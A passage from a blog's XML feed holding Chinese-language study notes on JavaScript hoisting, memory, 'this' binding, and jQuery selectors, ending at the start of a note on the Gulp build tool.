class="number">10</span>,</div><div class="line"><span class="symbol">    c:</span> <span class="params">&lt;c reference&gt;</span>,  <span class="comment">// 表示c的地址引用</span></div><div class="line"><span class="symbol">    a:</span> undefined,</div><div class="line"><span class="symbol">    b:</span> undefined</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>未进入执行阶段之前，变量对象中的属性都不能访问！但是进入执行阶段之后，变量对象转变为了活动对象，里面的属性都能被访问了，然后开始进行执行阶段的操作。<br>这两个对象其实是同一个对象，只是处于执行上下文的不同生命周期。  </p>
<p>全局上下文的变量对象(以浏览器为例),它的变量对象，就是window对象。而这个特殊，在this指向上也同样适用，this也是指向window。  </p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 以浏览器中为例，全局对象为window</span></div><div class="line"><span class="comment">// 全局上下文</span></div><div class="line">windowEC = &#123;</div><div class="line">    VO: <span class="built_in">window</span>,</div><div class="line">    scopeChain: &#123;&#125;,</div><div class="line">    <span class="keyword">this</span>: <span class="built_in">window</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript学习之函数及变量hoist]]></title>
      <url>/2017/03/24/Front%20End/JS%E5%AD%A6%E4%B9%A0%E4%B9%8Bhoist/</url>
      <content type="html"><![CDATA[<p>JavaScript能够在变量和函数被声明之前使用它们。hoist是在变量对象创建时发生的。可以参考另一篇文章JavaScript的执行上下文。<br><a id="more"></a>  </p>
<h2 id="一、变量声明“被提前”"><a href="#一、变量声明“被提前”" class="headerlink" title="一、变量声明“被提前”"></a>一、变量声明“被提前”</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">console</span>.log(a); <span class="comment">//undefined</span></div><div class="line"><span class="keyword">var</span> a = <span class="string">"test"</span>;</div><div class="line"><span class="built_in">console</span>.log(a); <span class="comment">//test</span></div></pre></td></tr></table></figure>
<p>1、解析器将当前作用域内声明的所有变量和函数都会放到作用域的开始处，但是，只有变量的声明被提前到作用域的开始处了，而赋值操作被保留在原处。<br>2、根据 JavaScript 语法的定义，已声明而未被赋值的变量会被自动赋值为 <code>undefined</code> 。所以第一次打印<code>a</code>时，值就为<code>undefined</code>。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.name = <span class="string">"window"</span>;</div><div class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(name); <span class="comment">//undefined</span></div><div class="line">    <span class="keyword">var</span> name = <span class="string">"inner"</span>;</div><div class="line">    <span class="built_in">console</span>.log(name); <span class="comment">//inner</span></div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
<p>由于局部变量的<code>name</code>被提前，导致无法在第一次打印时获取全局变量的<code>name</code>。  </p>
<h2 id="二、函数声明“被提前”"><a href="#二、函数声明“被提前”" class="headerlink" title="二、函数声明“被提前”"></a>二、函数声明“被提前”</h2><p>函数声明和函数表达式并非一视同仁。解析器会率先读取函数声明，但对于函数表达式，则必须等到解析器执行到它所在的代码行，才会被解释执行。  </p>
<figure class="highlight scilab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">sum</span>(<span class="number">1</span>, <span class="number">1</span>); <span class="comment">//2</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span><span class="params">(num1, num2)</span> &#123;</span></div><div class="line">    console.<span class="built_in">log</span>(num1 + num2);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>函数声明并不仅仅是函数名“被提前”了，整个函数的定义也“被提前”了。  </p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">sum</span>(<span class="number">1</span>, <span class="number">1</span>); //Uncaught TypeError: <span class="built_in">sum</span> is not a <span class="function"><span class="keyword">function</span></span></div><div class="line"></div><div class="line">var <span class="built_in">sum</span> = <span class="function"><span class="keyword">function</span><span class="params">(num1, num2)</span></span> &#123;</div><div class="line">    console.<span class="built_in">log</span>(num1 + num2);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>函数表达式单单变量被提前了，它的赋值（函数）却没有提前。  </p>
<h2 id="三、不用var声明的变量"><a href="#三、不用var声明的变量" class="headerlink" title="三、不用var声明的变量"></a>三、不用var声明的变量</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">console.log(a)<span class="comment">; //a is not defined</span></div><div class="line"><span class="attribute">a</span> = <span class="number">10</span><span class="comment">;</span></div><div class="line">console.log(a)<span class="comment">;</span></div></pre></td></tr></table></figure>
<p>由于变量a没有用<code>var</code>声明，则认为它是个全局变量并且没有被提前。  </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">a</span> = <span class="number">10</span><span class="comment">;</span></div><div class="line">console.log(a)<span class="comment">; //10</span></div><div class="line">delete a<span class="comment">;</span></div><div class="line">console.log(a)<span class="comment">; //a is not defined</span></div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</div><div class="line"><span class="built_in">console</span>.log(a); <span class="comment">//10</span></div><div class="line"><span class="keyword">delete</span> a;</div><div class="line"><span class="built_in">console</span>.log(a); <span class="comment">//10</span></div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    a = <span class="number">10</span>;</div><div class="line">    <span class="built_in">console</span>.log(a); <span class="comment">//10</span></div><div class="line"></div><div class="line">&#125;</div><div class="line">test();</div><div class="line"><span class="keyword">delete</span> a;</div><div class="line"><span class="built_in">console</span>.log(a); <span class="comment">//a is not defined</span></div></pre></td></tr></table></figure>
<p>没有var声明的变量，可以使用delete  </p>
<h2 id="四、function与var的优先级"><a href="#四、function与var的优先级" class="headerlink" title="四、function与var的优先级"></a>四、function与var的优先级</h2><p>1、function声明的函数在遇到相同函数名时会覆盖之前的属性值。<br>2、var声明的变量在遇到相同变量名时会跳过，不进行覆盖。<br>3、function比var早提升。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(foo); <span class="comment">//function foo()&#123;return 'hello';&#125;</span></div><div class="line">    <span class="built_in">console</span>.log(bar); <span class="comment">//undefined</span></div><div class="line"></div><div class="line">    <span class="keyword">var</span> foo = <span class="string">'Hello'</span>;</div><div class="line">    <span class="built_in">console</span>.log(foo); <span class="comment">//Hello</span></div><div class="line">    <span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">'world'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">'hello'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">test();</div></pre></td></tr></table></figure>
<p>下面是正确的顺序  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">'hello'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> bar;</div><div class="line">    </div><div class="line">    <span class="built_in">console</span>.log(foo); <span class="comment">//function foo()&#123;return 'hello';&#125;</span></div><div class="line">    <span class="built_in">console</span>.log(bar); <span class="comment">//undefined</span></div><div class="line"></div><div class="line">    foo = <span class="string">'Hello'</span>;</div><div class="line">    <span class="built_in">console</span>.log(foo); <span class="comment">//Hello</span></div><div class="line">    </div><div class="line">    bar = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">'world'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>1、变量的声明被提前到作用域顶部，赋值保留在原地<br>2、函数声明整个“被提前”<br>3、函数作为值赋给变量时只有变量“被提前”了，函数没有“被提前”<br>4、function声明会比var声明优先级更高一点  </p>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript学习之内存]]></title>
      <url>/2017/03/24/Front%20End/JS%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%86%85%E5%AD%98/</url>
      <content type="html"><![CDATA[<p>初学JavaScript时，看红皮书了解了JS基本类型和引用类型在内存中的位置，结果看了简书里的一篇文章，发现对这块的了解还是有些缺陷。<br><a id="more"></a></p>
<h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><p>JavaScript中的基本类型有五种:<code>Undefined</code>,<code>Null</code>,<code>Number</code>,<code>String</code>,<code>Boolean</code>。它们是按值访问，可以操作保存在变量中实际的值。这些基本类型是存放在变量对象中的，而变量对象也是存放在堆内存中。只是由于变量对象的特殊性，我们在理解时才把变量对象与堆内存区分开来。<br>下面我们用代码与图更好的理解这个过程  </p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">var a</span> = <span class="string">"5"</span>;</div><div class="line"><span class="attribute">var b</span> = a;</div><div class="line"><span class="attribute">a</span> = 10;</div></pre></td></tr></table></figure>
<p>基本类型进行赋值操作时，会为新的变量分配一个值，这两个变量相互独立，互不影响。即使改变了a的值，b的值也不会变。<br><img src="/images/JS基本类型操作.png" alt="JS基本类型">  </p>
<h2 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h2><p>引用数据类型的值是保存在堆内存中的对象。在操作对象时，实际上是在操作对象的引用而不是实际的对象。因此，引用类型的值都是按引用访问的。这里的引用，我们可以粗浅地理解为保存在变量对象中的一个地址，该地址与堆内存的实际值相关联。  </p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var a = &#123;name: <span class="string">"Kol"</span>&#125;<span class="comment">;</span></div><div class="line">var <span class="keyword">b </span>= a<span class="comment">;</span></div><div class="line"><span class="keyword">b.name </span>= <span class="string">"Kylen"</span><span class="comment">;</span></div></pre></td></tr></table></figure>
<p>引用类型的复制同样也会为新的变量自动分配一个新的值保存在变量对象中，但不同的是，这个新的值，仅仅只是引用类型的一个地址指针。当地址指针相同时，尽管他们相互独立，但是在变量对象中访问到的具体对象实际上是同一个。<br><img src="/images/JS引用类型操作.png" alt="JS引用类型">  </p>
<h2 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h2><p>JavaScript的垃圾收集有两种:标记清除、引用计数。<br>在局部作用域中，当函数执行结束，离开作用域的值就会被标记为可回收，在垃圾收集期间就会被删除。但是全局变量和全局对象的属性需要我们手动将其值设置为null来释放其引用（解除引用）  </p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var <span class="keyword">a</span> = <span class="number">1</span>;<span class="comment"> //在内存中给数值变量分配空间</span></div><div class="line">console.<span class="built_in">log</span>(<span class="keyword">a</span>);<span class="comment"> //使用内存</span></div><div class="line"><span class="keyword">a</span> = <span class="literal">null</span>;<span class="comment"> //使用完毕之后，释放内存空间</span></div></pre></td></tr></table></figure>
<p>但解除一个值的引用并不意味着自动回收该值所占用的内存。解除引用的真正作用是让值脱离执行环境，以便垃圾收集器下次运行时将其回收。  </p>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript学习之this]]></title>
      <url>/2017/03/23/Front%20End/JS%E5%AD%A6%E4%B9%A0%E4%B9%8Bthiis/</url>
      <content type="html"><![CDATA[<p>在调用函数之前，this的值是不确定的，this可能会在代码执行过程中引用不同的对象。<br><a id="more"></a></p>
<h2 id="一、全局范围"><a href="#一、全局范围" class="headerlink" title="一、全局范围"></a>一、全局范围</h2><p>全局范围使用this指向的是全局变量，浏览器环境下就是window。strict模式下没有全局变量，这里的this是undefined。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">console.<span class="built_in">log</span>(<span class="keyword">this</span>); <span class="comment">//全局变量</span></div></pre></td></tr></table></figure></p>
<h2 id="二、函数调用"><a href="#二、函数调用" class="headerlink" title="二、函数调用"></a>二、函数调用</h2><p>函数调用中的this也是指向全局变量。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>);</div><div class="line">&#125;</div><div class="line">test();<span class="comment">//全局变量</span></div></pre></td></tr></table></figure></p>
<h2 id="三、对象调用方法"><a href="#三、对象调用方法" class="headerlink" title="三、对象调用方法"></a>三、对象调用方法</h2><p>对象方法调用中，this指的是调用者。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> test = &#123;</div><div class="line">    <span class="attr">foo</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">test.foo(); <span class="comment">//test对象</span></div></pre></td></tr></table></figure></p>
<p>由于this的晚绑定性，同样代码段，只有在运行时才能确定this指向。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> test = &#123;</div><div class="line">    <span class="attr">foo</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> test2 = test.foo;</div><div class="line">test2(); <span class="comment">//全局变量</span></div></pre></td></tr></table></figure></p>
<h2 id="四、构造函数"><a href="#四、构造函数" class="headerlink" title="四、构造函数"></a>四、构造函数</h2><p>在构造函数内部，this指向新创建的对象。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); </div><div class="line">&#125;</div><div class="line"><span class="keyword">new</span> Foo(); <span class="comment">//新创建的对象</span></div></pre></td></tr></table></figure></p>
<h2 id="五、显示设置this"><a href="#五、显示设置this" class="headerlink" title="五、显示设置this"></a>五、显示设置this</h2><p>使用Function.prototyppe的call或者apply方法时，函数内部this会被设置为传入的第一个参数。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a, b</span>)</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> bar=&#123;&#125;;</div><div class="line"></div><div class="line">foo.apply(bar,[<span class="number">1</span>, <span class="number">2</span>]); <span class="comment">//bar对象</span></div><div class="line">foo.call(<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>); <span class="comment">//Number对象</span></div></pre></td></tr></table></figure></p>
<h2 id="六、bind"><a href="#六、bind" class="headerlink" title="六、bind"></a>六、bind</h2><p>bind后的函数不能再次bind<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">function <span class="built_in">f</span>()&#123;</div><div class="line">    <span class="keyword">return</span> this.a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> <span class="keyword">g</span> = f.bind(&#123;a:<span class="string">"g"</span>&#125;);</div><div class="line">console.<span class="built_in">log</span>(<span class="keyword">g</span>()); <span class="comment">//g  </span></div><div class="line"></div><div class="line"><span class="keyword">var</span> <span class="keyword">h</span> = <span class="keyword">g</span>.bind(&#123;a:<span class="string">"h"</span>&#125;); <span class="comment">//bind only works once;</span></div><div class="line">console.<span class="built_in">log</span>(<span class="built_in">h</span>()); <span class="comment">//g  </span></div><div class="line"></div><div class="line"><span class="keyword">var</span> i = f.bind(&#123;a:<span class="string">"i"</span>&#125;);</div><div class="line">console.<span class="built_in">log</span>(<span class="built_in">i</span>()); <span class="comment">//i  </span></div><div class="line"></div><div class="line"><span class="keyword">var</span> o=&#123;a:<span class="string">"37"</span>,<span class="keyword">g</span>:<span class="keyword">g</span>,f:f,<span class="keyword">h</span>:<span class="keyword">h</span>&#125;;</div><div class="line">console.<span class="built_in">log</span>(o.<span class="built_in">f</span>(),o.<span class="keyword">g</span>(),o.<span class="built_in">h</span>()); <span class="comment">//37 g g</span></div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jQuery样式篇]]></title>
      <url>/2017/03/21/Front%20End/jQuery%E6%A0%B7%E5%BC%8F/</url>
      <content type="html"><![CDATA[<p>jQuery样式学习篇<br><a id="more"></a></p>
<h2 id="一、jQuery对象与Dom对象"><a href="#一、jQuery对象与Dom对象" class="headerlink" title="一、jQuery对象与Dom对象"></a>一、jQuery对象与Dom对象</h2><p>1、jQuery对象与DOM对象是不一样的<br>2、通过jQuery方法包装后的对象，是一个类数组对象。这个对象里面包含了DOM对象的信息，然后封装了很多操作方法，调用自己的方法html与css，得到的效果与标准的JavaScript处理结果是一致的。它与DOM对象完全不同，唯一相似的是它们都能操作DOM。 </p>
<h2 id="二、jQuery对象转化成DOM对象"><a href="#二、jQuery对象转化成DOM对象" class="headerlink" title="二、jQuery对象转化成DOM对象"></a>二、jQuery对象转化成DOM对象</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;div&gt;元素一&lt;/div&gt;</div><div class="line">&lt;div&gt;元素二&lt;/div&gt;</div><div class="line">&lt;div&gt;元素三&lt;/div&gt; </div><div class="line"></div><div class="line"><span class="selector-tag">var</span> <span class="variable">$div</span> = $(<span class="string">'div'</span>) <span class="comment">//jQuery对象</span></div><div class="line"><span class="selector-tag">var</span> <span class="selector-tag">div</span> = <span class="variable">$div</span>[<span class="number">0</span>] <span class="comment">//转化成DOM对象</span></div><div class="line"><span class="selector-tag">div</span><span class="selector-class">.style</span><span class="selector-class">.color</span> = <span class="string">'red'</span> <span class="comment">//操作dom对象的属性 </span></div><div class="line"></div><div class="line"><span class="selector-tag">var</span> <span class="selector-tag">div</span> = <span class="variable">$div</span>.get(<span class="number">0</span>)</div></pre></td></tr></table></figure>
<h2 id="三、DOM对象转化成jQuery对象"><a href="#三、DOM对象转化成jQuery对象" class="headerlink" title="三、DOM对象转化成jQuery对象"></a>三、DOM对象转化成jQuery对象</h2><p>如果传递给$(DOM)函数的参数是一个DOM对象，jQuery方法会把这个DOM对象给包装成一个新的jQuery对象 </p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="built-in">div</span>&gt;元素一&lt;/<span class="built-in">div</span>&gt;</div><div class="line">&lt;<span class="built-in">div</span>&gt;元素二&lt;/<span class="built-in">div</span>&gt;</div><div class="line">&lt;<span class="built-in">div</span>&gt;元素三&lt;/<span class="built-in">div</span>&gt; </div><div class="line"></div><div class="line">var <span class="built-in">div</span> = document.getElementsByTagName(<span class="string">'div'</span>); <span class="comment">//dom对象</span></div><div class="line">var <span class="symbol">$</span><span class="built-in">div</span> = <span class="symbol">$</span>(<span class="built-in">div</span>); <span class="comment">//jQuery对象</span></div><div class="line">var <span class="symbol">$</span>first = <span class="symbol">$</span><span class="built-in">div</span>.first(); <span class="comment">//找到第一个div元素</span></div><div class="line"><span class="meta"><span class="meta-keyword">$first</span>.css('color', 'red'); //给第一个元素设置颜色</span></div></pre></td></tr></table></figure>
<h2 id="四、选择器"><a href="#四、选择器" class="headerlink" title="四、选择器"></a>四、选择器</h2><p>1、id选择器</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$(</span> <span class="string">"#id"</span> )</div></pre></td></tr></table></figure>
<p>2、类选择器</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$(</span> <span class="string">".class"</span> )</div></pre></td></tr></table></figure>
<p>3、元素选择器</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$(</span> <span class="string">"element"</span> )</div></pre></td></tr></table></figure>
<p>4、全选择器</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$(</span> <span class="string">"*"</span> )</div></pre></td></tr></table></figure>
<p>5、层级选择器</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">$</span>(<span class="string">"parent &gt; child"</span>) <span class="comment">//子选择器:选择所有指定“parent”元素中指定的"child"的直接子元素</span></div><div class="line"></div><div class="line"><span class="symbol">$</span>(<span class="string">"ancestor descendant"</span>) <span class="comment">//后代选择器:选择给定的祖先元素的所有后代元素, 一个元素的后代可能是该元素的一个孩子，孙子，曾孙等</span></div><div class="line"></div><div class="line"><span class="symbol">$</span>(<span class="string">"prev + next"</span>) <span class="comment">//相邻兄弟选择器:选择所有紧接在“prev”元素后的“next”元素</span></div><div class="line"></div><div class="line"><span class="symbol">$</span>(<span class="string">"prev ~ siblings"</span>) <span class="comment">//一般兄弟选择器:匹配“prev”元素之后的所有 兄弟元素。具有相同的父元素，并匹配过滤“siblings”选择器</span></div></pre></td></tr></table></figure>
<p>6、基本筛选选择器<br><img src="/images/jQuery基本筛选选择器.jpg" alt="基本筛选选择器"></p>
<p>7、内容筛选选择器</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">$</span>(<span class="string">":contains(text)"</span>) <span class="comment">//选择包含所有指定文本的元素</span></div><div class="line"><span class="symbol">$</span>(<span class="string">":has(selector)"</span>) <span class="comment">//选择元素中至少包含指定选择器的元素</span></div><div class="line"><span class="symbol">$</span>(<span class="string">":parent"</span>) <span class="comment">//选择所有含有子元素或者文本的元素</span></div><div class="line"><span class="symbol">$</span>(<span class="string">":empty"</span>) <span class="comment">//选择所有没有子元素的元素（包含文本节点）</span></div></pre></td></tr></table></figure>
<p>①:contains与:has都有查找的意思，但是contains查找包含“指定文本”的元素，has查找包含“指定元素”的元素。<br>②如果:contains匹配的文本包含在元素的子元素中，同样认为是符合条件的。<br>③:parent与:empty是相反的，两者所涉及的子元素，包括文本节点。 </p>
<h2 id="可见性筛选选择器"><a href="#可见性筛选选择器" class="headerlink" title="可见性筛选选择器"></a>可见性筛选选择器</h2><p>占用空间布局的被认为是可见的 </p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">$</span>(<span class="string">":visible"</span>) <span class="comment">//选择所有显示元素</span></div><div class="line"><span class="symbol">$</span>(<span class="string">":hidden"</span>) <span class="comment">//选择所有隐藏元素 该选择器对 visibility:hidden 和 opacity: 0 的元素不起作用。</span></div></pre></td></tr></table></figure>
<h2 id="属性筛选选择器"><a href="#属性筛选选择器" class="headerlink" title="属性筛选选择器"></a>属性筛选选择器</h2><p><img src="/images/jQuery属性筛选选择器.jpg" alt="属性筛选选择器"><br>在这么多属性选择器中[attr=”value”]和[attr*=”value”]是最实用的 </p>
<p>## </p>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[自动化构建工具以及打包工具]]></title>
      <url>/2017/03/13/Tools/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<p>1、Gulp<br>2、Grunt<br>3、Webpack<br><a id="more"></a></p>
<h2 id="一、Gulp"><a href="#一、Gulp" class="headerlink" title="一、Gulp"></a>一、Gulp</h2><p>1、全局下载<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo <span class="built_in">npm</span> install --<span class="built_in">global</span> gulp</div></pre></td></tr></table></figure></p>
<p>2、在项目根目录下创建一个名为 <code>gulpfile.js</code> 的文件<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</div><div class="line"></div><div class="line">gulp.task(<span class="string">'default'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="comment">// 将你的默认的任务代码放在这</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>3、运行<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gulp <span class="tag">&lt;<span class="name">task</span>&gt;</span> <span class="tag">&lt;<span class="name">othertask</span>&gt;</span></div></pre></td></tr></table></figure></p>
